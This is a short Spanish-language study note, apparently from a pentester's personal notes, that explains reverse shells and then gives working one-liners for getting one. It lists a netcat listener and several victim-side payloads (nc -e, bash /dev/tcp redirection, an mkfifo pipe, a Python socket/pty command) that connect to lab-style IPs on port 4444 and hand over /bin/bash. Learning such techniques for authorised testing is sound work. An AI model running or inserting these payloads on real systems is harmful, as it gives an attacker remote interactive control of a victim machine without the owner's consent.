
---
- Tags: #Network #Post-exploitation  #Attacks 
- --- 
# Qué es? 

Una **reverse shell** es una técnica donde:

- **El atacante abre un puerto y escucha**  
- **La víctima inicia la conexión hacia el atacante**  
- Esa conexión queda ligada a una **shell del sistema víctima**

**Frase clave**:

> _La víctima llama al atacante y le entrega su shell._

**_Es la que se ocupa casi todo el tiempo_** 

# Explotación

**Desde nuestra máquina**

```bash
nc -lvnp 4444
```
_Nos ponemos en escucha_

**Desde la máquina víctima:**

```bash
nc 10.10.10.10 4444 -e /bin/bash
```

Nos conectamos a nuestra máquina y le otorgamos una bash. 

**_Debido a que casi siempre `e` está inhabilitado, deberemos usar alternativas**:

## Alternativas:

- La más **común**:

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

- En caso de que no haya **/dev/tcp**:

```bash
mkfifo /tmp/f; nc 10.10.14.3 4444 < /tmp/f | /bin/bash > /tmp/f
```

- Con **python**:

```python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.3",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

